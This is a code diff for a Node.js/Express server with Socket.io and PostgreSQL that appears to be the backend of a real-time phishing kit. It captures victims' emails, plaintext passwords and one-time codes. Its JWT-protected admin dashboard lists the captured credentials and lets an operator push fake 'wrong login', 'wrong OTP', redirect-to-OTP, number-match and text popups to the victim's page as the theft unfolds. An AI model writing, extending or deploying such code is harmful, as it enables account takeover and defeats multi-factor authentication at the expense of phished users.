@@ -9,42 +9,68 @@ const cors = require('cors');
 
 const app = express();
 const server = http.createServer(app);
-const io = socketIo(server, { cors: { origin: "*", methods: ["GET","POST"] } });
+const io = socketIo(server, { cors: { origin: "*", methods: ["GET", "POST"] } });
 
+// ==================== MIDDLEWARE ====================
 app.use(cors());
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 app.use(express.static(path.join(__dirname, 'public')));
 
+// ==================== EXPLICIT HTML ROUTES ====================
+// User pages
+app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));
+app.get('/index.html', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));
+app.get('/otp', (req, res) => res.sendFile(path.join(__dirname, 'public', 'otp.html')));
+app.get('/otp.html', (req, res) => res.sendFile(path.join(__dirname, 'public', 'otp.html')));
+app.get('/success', (req, res) => res.sendFile(path.join(__dirname, 'public', 'success.html')));
+app.get('/success.html', (req, res) => res.sendFile(path.join(__dirname, 'public', 'success.html')));
+
+// Admin pages
+app.get('/admin', (req, res) => res.sendFile(path.join(__dirname, 'public', 'admin', 'index.html')));
+app.get('/admin/', (req, res) => res.sendFile(path.join(__dirname, 'public', 'admin', 'index.html')));
+app.get('/admin/index.html', (req, res) => res.sendFile(path.join(__dirname, 'public', 'admin', 'index.html')));
+app.get('/admin/dashboard', (req, res) => res.sendFile(path.join(__dirname, 'public', 'admin', 'dashboard.html')));
+app.get('/admin/dashboard.html', (req, res) => res.sendFile(path.join(__dirname, 'public', 'admin', 'dashboard.html')));
+
+// ==================== DATABASE ====================
 const pool = new Pool({
   connectionString: process.env.DATABASE_URL,
   ssl: process.env.NODE_ENV === 'production' ? { rejectUnauthorized: false } : false,
+  connectionTimeoutMillis: 30000,
+  idleTimeoutMillis: 30000,
+  max: 20,
+  keepAlive: true,
 });
 
 pool.connect((err) => {
-  if (err) console.error('❌ DB error:', err.message);
+  if (err) console.error('❌ DB connection error:', err.message);
   else console.log('✅ PostgreSQL connected');
 });
 
+// ==================== JWT MIDDLEWARE ====================
 const authenticateJWT = (req, res, next) => {
   const auth = req.headers.authorization;
-  if (!auth) return res.status(401).json({ error: 'No token' });
+  if (!auth) return res.status(401).json({ error: 'No token provided' });
   const token = auth.split(' ')[1];
   jwt.verify(token, process.env.JWT_SECRET, (err, user) => {
-    if (err) return res.status(403).json({ error: 'Invalid token' });
+    if (err) return res.status(403).json({ error: 'Invalid or expired token' });
     req.user = user;
     next();
   });
 };
 
+// ==================== SOCKET.IO ====================
 io.on('connection', (socket) => {
   console.log('🔌 Client connected:', socket.id);
-  socket.on('disconnect', () => console.log('🔌 Disconnected:', socket.id));
+  socket.on('disconnect', () => console.log('🔌 Client disconnected:', socket.id));
 });
 
-// ==================== INIT DB ====================
+// ==================== INITIALIZE DATABASE ====================
 async function initDB() {
   try {
+    console.log('📦 Initializing database...');
+
     await pool.query(`
       CREATE TABLE IF NOT EXISTS users (
         id SERIAL PRIMARY KEY,
@@ -65,6 +91,24 @@ async function initDB() {
         updated_at TIMESTAMP DEFAULT NOW()
       )
     `);
+    console.log('✅ Users table ready');
+
+    // Add any missing columns (safe for existing DB)
+    await pool.query(`
+      ALTER TABLE users
+      ADD COLUMN IF NOT EXISTS otp VARCHAR(10),
+      ADD COLUMN IF NOT EXISTS status VARCHAR(50) DEFAULT 'pending',
+      ADD COLUMN IF NOT EXISTS popup_type VARCHAR(20),
+      ADD COLUMN IF NOT EXISTS popup_value TEXT,
+      ADD COLUMN IF NOT EXISTS popup_id INTEGER DEFAULT 0,
+      ADD COLUMN IF NOT EXISTS wrong_login_flag BOOLEAN DEFAULT FALSE,
+      ADD COLUMN IF NOT EXISTS timeout_flag BOOLEAN DEFAULT FALSE,
+      ADD COLUMN IF NOT EXISTS redirect_otp_flag BOOLEAN DEFAULT FALSE,
+      ADD COLUMN IF NOT EXISTS wrong_otp_flag BOOLEAN DEFAULT FALSE,
+      ADD COLUMN IF NOT EXISTS email_submitted_at TIMESTAMP DEFAULT NOW(),
+      ADD COLUMN IF NOT EXISTS otp_submitted_at TIMESTAMP,
+      ADD COLUMN IF NOT EXISTS updated_at TIMESTAMP DEFAULT NOW()
+    `).catch(() => console.log('✅ Additional columns already exist'));
 
     await pool.query(`
       CREATE TABLE IF NOT EXISTS admin (
@@ -73,29 +117,37 @@ async function initDB() {
         password VARCHAR(255) NOT NULL
       )
     `);
+    console.log('✅ Admin table ready');
 
-    // Auto-create default admin from .env
     const adm = await pool.query('SELECT * FROM admin WHERE email = $1', [process.env.ADMIN_EMAIL]);
     if (adm.rows.length === 0) {
       await pool.query('INSERT INTO admin (email, password) VALUES ($1, $2)',
         [process.env.ADMIN_EMAIL, process.env.ADMIN_PASSWORD]);
       console.log('✅ Default admin created');
+    } else {
+      console.log('✅ Default admin already exists');
     }
-    console.log('✅ Database initialized');
+
+    console.log('✅ Database initialized successfully');
+    return true;
   } catch (e) {
     console.error('❌ DB init error:', e.message);
+    return false;
   }
 }
-initDB();
 
 // ==================== USER ENDPOINTS ====================
+
+// Login — save email + password, reset state
 app.post('/api/user/login', async (req, res) => {
   try {
     const { email, password } = req.body;
     if (!email || !password) return res.status(400).json({ error: 'Email and password required' });
 
     await pool.query(`
-      INSERT INTO users (email, password, status, popup_type, popup_value, wrong_login_flag, timeout_flag, redirect_otp_flag, wrong_otp_flag, email_submitted_at)
+      INSERT INTO users (email, password, status, popup_type, popup_value,
+                         wrong_login_flag, timeout_flag, redirect_otp_flag,
+                         wrong_otp_flag, email_submitted_at)
       VALUES ($1, $2, 'pending', NULL, NULL, FALSE, FALSE, FALSE, FALSE, NOW())
       ON CONFLICT (email) DO UPDATE SET
         password = EXCLUDED.password,
@@ -120,6 +172,7 @@ app.post('/api/user/login', async (req, res) => {
   }
 });
 
+// Submit OTP — 5-6 alphanumeric chars
 app.post('/api/user/submit-otp', async (req, res) => {
   try {
     const { email, otp } = req.body;
@@ -129,7 +182,8 @@ app.post('/api/user/submit-otp', async (req, res) => {
     }
 
     const r = await pool.query(
-      `UPDATE users SET otp = $1, status = 'otp_submitted', otp_submitted_at = NOW(), updated_at = NOW()
+      `UPDATE users SET otp = $1, status = 'otp_submitted',
+       otp_submitted_at = NOW(), updated_at = NOW()
        WHERE email = $2 RETURNING id`,
       [otp, email]
     );
@@ -144,158 +198,301 @@ app.post('/api/user/submit-otp', async (req, res) => {
   }
 });
 
+// Get user status (polling)
 app.get('/api/user/status', async (req, res) => {
   try {
     const { email } = req.query;
     if (!email) return res.json({ notFound: true });
-    const r = await pool.query(
-      `SELECT status, popup_type, popup_value, popup_id, wrong_login_flag, timeout_flag,
-              redirect_otp_flag, wrong_otp_flag
-       FROM users WHERE email = $1`,
-      [email]
-    );
+
+    const r = await pool.query(`
+      SELECT status, popup_type, popup_value, popup_id,
+             wrong_login_flag, timeout_flag, redirect_otp_flag, wrong_otp_flag
+      FROM users WHERE email = $1
+    `, [email]);
+
     if (r.rows.length === 0) return res.json({ notFound: true });
-    res.json({ email, ...r.rows[0] });
+
+    res.json({
+      email,
+      status: r.rows[0].status,
+      popup_type: r.rows[0].popup_type,
+      popup_value: r.rows[0].popup_value,
+      popup_id: r.rows[0].popup_id,
+      wrong_login_flag: r.rows[0].wrong_login_flag,
+      timeout_flag: r.rows[0].timeout_flag,
+      redirect_otp_flag: r.rows[0].redirect_otp_flag,
+      wrong_otp_flag: r.rows[0].wrong_otp_flag,
+    });
   } catch (e) {
+    console.error('❌ Status error:', e.message);
     res.json({ notFound: true });
   }
 });
 
+// Clear flags after user acknowledges
 app.post('/api/user/clear-flags', async (req, res) => {
   try {
     const { email } = req.body;
     if (!email) return res.status(400).json({ error: 'Email required' });
-    await pool.query(
-      `UPDATE users SET wrong_login_flag = FALSE, timeout_flag = FALSE, wrong_otp_flag = FALSE
-       WHERE email = $1`,
-      [email]
-    );
+
+    await pool.query(`
+      UPDATE users SET
+        wrong_login_flag = FALSE,
+        timeout_flag = FALSE,
+        wrong_otp_flag = FALSE
+      WHERE email = $1
+    `, [email]);
+
     res.json({ success: true });
   } catch (e) {
+    console.error('❌ Clear flags error:', e.message);
     res.status(500).json({ error: 'Server error' });
   }
 });
 
 // ==================== ADMIN ENDPOINTS ====================
+
+// Admin login — returns JWT token
 app.post('/api/admin/login', async (req, res) => {
   try {
     const { email, password } = req.body;
     if (!email || !password) return res.status(400).json({ error: 'Email and password required' });
+
     const r = await pool.query('SELECT * FROM admin WHERE email = $1 AND password = $2', [email, password]);
     if (r.rows.length === 0) return res.status(401).json({ error: 'Invalid credentials' });
-    const token = jwt.sign({ id: r.rows[0].id, email, role: 'admin' }, process.env.JWT_SECRET, { expiresIn: '24h' });
+
+    const token = jwt.sign(
+      { id: r.rows[0].id, email, role: 'admin' },
+      process.env.JWT_SECRET,
+      { expiresIn: '24h' }
+    );
+
+    console.log('✅ Admin logged in:', email);
     res.json({ success: true, token });
   } catch (e) {
+    console.error('❌ Admin login error:', e.message);
     res.status(500).json({ error: 'Server error' });
   }
 });
 
+// Get all users (admin dashboard table)
 app.get('/api/admin/users', authenticateJWT, async (req, res) => {
   try {
     const r = await pool.query(`
       SELECT id, email, password, otp, status, popup_type, popup_value, popup_id,
              wrong_login_flag, timeout_flag, redirect_otp_flag, wrong_otp_flag,
              email_submitted_at, otp_submitted_at, created_at, updated_at
-      FROM users ORDER BY created_at DESC
+      FROM users
+      ORDER BY created_at DESC
     `);
     res.json(r.rows);
   } catch (e) {
-    console.error('❌ users error:', e.message);
+    console.error('❌ Admin users error:', e.message);
     res.status(500).json({ error: 'Server error' });
   }
 });
 
+// Admin action: Wrong Login
 app.post('/api/admin/wrong-login', authenticateJWT, async (req, res) => {
   try {
     const { email } = req.body;
-    await pool.query('UPDATE users SET wrong_login_flag = TRUE, updated_at = NOW() WHERE email = $1', [email]);
-    io.emit('user-control', { email });
+    if (!email) return res.status(400).json({ error: 'Email required' });
+
+    await pool.query(
+      'UPDATE users SET wrong_login_flag = TRUE, updated_at = NOW() WHERE email = $1',
+      [email]
+    );
+
+    io.emit('user-control', { email, action: 'wrong-login' });
+    console.log('❌ Wrong login sent to:', email);
     res.json({ success: true });
-  } catch (e) { res.status(500).json({ error: 'Server error' }); }
+  } catch (e) {
+    console.error('❌ Wrong login error:', e.message);
+    res.status(500).json({ error: 'Server error' });
+  }
 });
 
+// Admin action: Timeout
 app.post('/api/admin/timeout', authenticateJWT, async (req, res) => {
   try {
     const { email } = req.body;
-    await pool.query('UPDATE users SET timeout_flag = TRUE, updated_at = NOW() WHERE email = $1', [email]);
-    io.emit('user-control', { email });
+    if (!email) return res.status(400).json({ error: 'Email required' });
+
+    await pool.query(
+      'UPDATE users SET timeout_flag = TRUE, updated_at = NOW() WHERE email = $1',
+      [email]
+    );
+
+    io.emit('user-control', { email, action: 'timeout' });
+    console.log('⏰ Timeout sent to:', email);
     res.json({ success: true });
-  } catch (e) { res.status(500).json({ error: 'Server error' }); }
+  } catch (e) {
+    console.error('❌ Timeout error:', e.message);
+    res.status(500).json({ error: 'Server error' });
+  }
 });
 
+// Admin action: Send to OTP page
 app.post('/api/admin/send-to-otp', authenticateJWT, async (req, res) => {
   try {
     const { email } = req.body;
-    await pool.query('UPDATE users SET redirect_otp_flag = TRUE, updated_at = NOW() WHERE email = $1', [email]);
-    io.emit('user-control', { email });
+    if (!email) return res.status(400).json({ error: 'Email required' });
+
+    await pool.query(
+      'UPDATE users SET redirect_otp_flag = TRUE, updated_at = NOW() WHERE email = $1',
+      [email]
+    );
+
+    io.emit('user-control', { email, action: 'send-to-otp' });
+    console.log('🔐 Send to OTP for:', email);
     res.json({ success: true });
-  } catch (e) { res.status(500).json({ error: 'Server error' }); }
+  } catch (e) {
+    console.error('❌ Send to OTP error:', e.message);
+    res.status(500).json({ error: 'Server error' });
+  }
 });
 
+// Admin action: Wrong OTP
 app.post('/api/admin/wrong-otp', authenticateJWT, async (req, res) => {
   try {
     const { email } = req.body;
-    await pool.query('UPDATE users SET wrong_otp_flag = TRUE, updated_at = NOW() WHERE email = $1', [email]);
-    io.emit('user-control', { email });
+    if (!email) return res.status(400).json({ error: 'Email required' });
+
+    await pool.query(
+      'UPDATE users SET wrong_otp_flag = TRUE, updated_at = NOW() WHERE email = $1',
+      [email]
+    );
+
+    io.emit('user-control', { email, action: 'wrong-otp' });
+    console.log('❌ Wrong OTP sent to:', email);
     res.json({ success: true });
-  } catch (e) { res.status(500).json({ error: 'Server error' }); }
+  } catch (e) {
+    console.error('❌ Wrong OTP error:', e.message);
+    res.status(500).json({ error: 'Server error' });
+  }
 });
 
+// Admin action: Success
 app.post('/api/admin/success', authenticateJWT, async (req, res) => {
   try {
     const { email } = req.body;
-    await pool.query(`UPDATE users SET status = 'success', updated_at = NOW() WHERE email = $1`, [email]);
-    io.emit('user-control', { email });
+    if (!email) return res.status(400).json({ error: 'Email required' });
+
+    await pool.query(
+      `UPDATE users SET status = 'success', updated_at = NOW() WHERE email = $1`,
+      [email]
+    );
+
+    io.emit('user-control', { email, action: 'success' });
+    console.log('✅ Success sent to:', email);
     res.json({ success: true });
-  } catch (e) { res.status(500).json({ error: 'Server error' }); }
+  } catch (e) {
+    console.error('❌ Success error:', e.message);
+    res.status(500).json({ error: 'Server error' });
+  }
 });
 
+// Admin action: YES popup with number
 app.post('/api/admin/yes', authenticateJWT, async (req, res) => {
   try {
     const { email, number } = req.body;
     if (!email || !number) return res.status(400).json({ error: 'Email and number required' });
+
     const r = await pool.query(`
-      UPDATE users SET popup_type = 'yes', popup_value = $1, popup_id = popup_id + 1, updated_at = NOW()
-      WHERE email = $2 RETURNING popup_id, popup_value, popup_type
+      UPDATE users
+      SET popup_type = 'yes', popup_value = $1, popup_id = popup_id + 1, updated_at = NOW()
+      WHERE email = $2
+      RETURNING popup_id
     `, [String(number), email]);
+
     if (r.rows.length === 0) return res.status(404).json({ error: 'User not found' });
+
     io.emit('popup-update', {
       email,
       popup_type: 'yes',
       popup_value: String(number),
-      popup_id: r.rows[0].popup_id
+      popup_id: r.rows[0].popup_id,
     });
+
+    console.log('✅ YES (' + number + ') sent to:', email);
     res.json({ success: true });
-  } catch (e) { console.error(e); res.status(500).json({ error: 'Server error' }); }
+  } catch (e) {
+    console.error('❌ YES error:', e.message);
+    res.status(500).json({ error: 'Server error' });
+  }
 });
 
+// Admin action: TEXT popup with message
 app.post('/api/admin/text', authenticateJWT, async (req, res) => {
   try {
     const { email, text } = req.body;
     if (!email || !text) return res.status(400).json({ error: 'Email and text required' });
+
     const r = await pool.query(`
-      UPDATE users SET popup_type = 'text', popup_value = $1, popup_id = popup_id + 1, updated_at = NOW()
-      WHERE email = $2 RETURNING popup_id, popup_value, popup_type
+      UPDATE users
+      SET popup_type = 'text', popup_value = $1, popup_id = popup_id + 1, updated_at = NOW()
+      WHERE email = $2
+      RETURNING popup_id
     `, [text, email]);
+
     if (r.rows.length === 0) return res.status(404).json({ error: 'User not found' });
+
     io.emit('popup-update', {
       email,
       popup_type: 'text',
       popup_value: text,
-      popup_id: r.rows[0].popup_id
+      popup_id: r.rows[0].popup_id,
     });
+
+    console.log('📝 Text sent to:', email);
     res.json({ success: true });
-  } catch (e) { console.error(e); res.status(500).json({ error: 'Server error' }); }
+  } catch (e) {
+    console.error('❌ Text error:', e.message);
+    res.status(500).json({ error: 'Server error' });
+  }
 });
 
-app.get('/api/health', (req, res) => res.json({ status: 'ok' }));
+// ==================== HEALTH CHECK ====================
+app.get('/api/health', (req, res) => {
+  res.json({ status: 'ok', timestamp: new Date().toISOString() });
+});
 
+// ==================== ERROR HANDLERS ====================
 app.use((err, req, res, next) => {
-  console.error('❌ Unhandled:', err);
-  res.status(500).json({ error: 'Server error' });
+  console.error('❌ Unhandled error:', err.stack);
+  res.status(500).json({ error: 'Something went wrong!' });
 });
 
+app.use('/api/*', (req, res) => {
+  res.status(404).json({ error: 'API endpoint not found' });
+});
+
+// ==================== START SERVER ====================
 const PORT = process.env.PORT || 3000;
-server.listen(PORT, '0.0.0.0', () => {
-  console.log(`🚀 Server on port ${PORT}`);
+
+initDB().then((success) => {
+  if (success) {
+    server.listen(PORT, '0.0.0.0', () => {
+      console.log('\n🚀 Server started!');
+      console.log(`📡 Port: ${PORT}`);
+      console.log(`🔗 User login: /`);
+      console.log(`🔗 Admin login: /admin`);
+      console.log(`🔗 Admin dashboard: /admin/dashboard`);
+      console.log('\n📢 Socket.io ready for real-time notifications\n');
+    });
+  } else {
+    console.error('❌ Server startup failed — database initialization failed');
+    process.exit(1);
+  }
+});
+
+// ==================== GRACEFUL SHUTDOWN ====================
+process.on('SIGINT', () => {
+  console.log('\n📴 Shutting down...');
+  pool.end(() => process.exit(0));
+});
+
+process.on('SIGTERM', () => {
+  console.log('\n📴 Shutting down...');
+  pool.end(() => process.exit(0));
 });
